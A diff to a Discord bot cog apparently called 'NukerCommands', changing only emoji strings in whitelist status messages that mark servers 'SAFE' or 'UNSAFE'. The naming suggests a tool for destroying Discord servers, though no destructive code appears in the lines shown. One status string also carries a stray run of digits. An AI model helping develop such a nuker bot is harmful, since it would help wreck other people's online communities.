@@ -599,7 +599,7 @@ class NukerCommands(commands.Cog):
         )
         embed.add_field(name="Server ID", value=f"`{server_id}`", inline=True)
         embed.add_field(name="Total Dynamic", value=f"`{len(self.whitelisted_servers)}`", inline=True)
-        embed.add_field(name="Status", value="🛡️ PROTECTED", inline=True)
+        embed.add_field(name="Status", value="<:emoji_20:1430082362129125486> PROTECTED", inline=True)
         
         await ctx.send(embed=embed)
         await self.send_admin_notification(f"<a:emoji_1:1430081383757512785> Server added to whitelist: **{server_name}**")
@@ -1174,7 +1174,7 @@ class NukerCommands(commands.Cog):
                 status = "<a:emoji_1:1430081383757512785>141074670453 PERMANENT WHITELIST | 🔒 SAFE"
                 emoji = "🔒"
             elif guild.id in self.whitelisted_servers:
-                status = "<a:emoji_1:1430081383757512785> DYNAMIC WHITELIST | 🛡️ SAFE"
+                status = "<a:emoji_1:1430081383757512785> DYNAMIC WHITELIST | <:emoji_20:1430082362129125486> SAFE"
                 emoji = "<:emoji_20:1430082362129125486>"
             else:
                 status = "❌ NOT WHITELISTED | 💀 UNSAFE"
@@ -1210,7 +1210,7 @@ class NukerCommands(commands.Cog):
         protected = sum(1 for g in self.bot.guilds if self.is_whitelisted(g.id))
         
         embed.add_field(
-            name="🟢 STATUS",
+            name="<a:verified:1408545305594433546> STATUS",
             value=f"• **Bot:** `{self.bot.user.name}`\n• **Ping:** `{round(self.bot.latency * 1000)}ms`\n• **Uptime:** `{self.get_uptime()}`",
             inline=False
         )
